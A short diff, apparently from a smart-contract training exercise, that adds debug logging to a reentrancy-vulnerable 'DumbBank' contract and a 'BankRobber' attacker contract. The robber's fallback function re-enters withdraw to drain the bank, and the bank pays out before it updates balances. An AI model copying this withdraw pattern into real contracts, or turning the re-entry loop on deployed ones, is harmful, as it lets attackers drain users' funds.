@@ -1,5 +1,7 @@
 pragma solidity 0.8.15;
 
+import "hardhat/console.sol";
+
 contract DumbBank {
     mapping(address => uint256) public balances;
 
@@ -9,8 +11,10 @@ contract DumbBank {
 
     function withdraw(uint256 amount) public {
         require(amount <= balances[msg.sender], "not enough funds");
-        (bool ok, ) = msg.sender.call{value: amount}("");
-        require(ok);
+        console.log("T", address(this).balance);
+        (bool ok,) = msg.sender.call{value: amount}("");
+        console.log("T1", address(this).balance);
+        require(ok, "BBB");
         unchecked {
             balances[msg.sender] -= amount;
         }
@@ -34,6 +38,7 @@ contract BankRobber {
     }
 
     fallback() external payable {
+        console.log("T2", address(this).balance);
         if (address(dumbBank).balance > 1 ether) {
             dumbBank.withdraw(1 ether);
         }
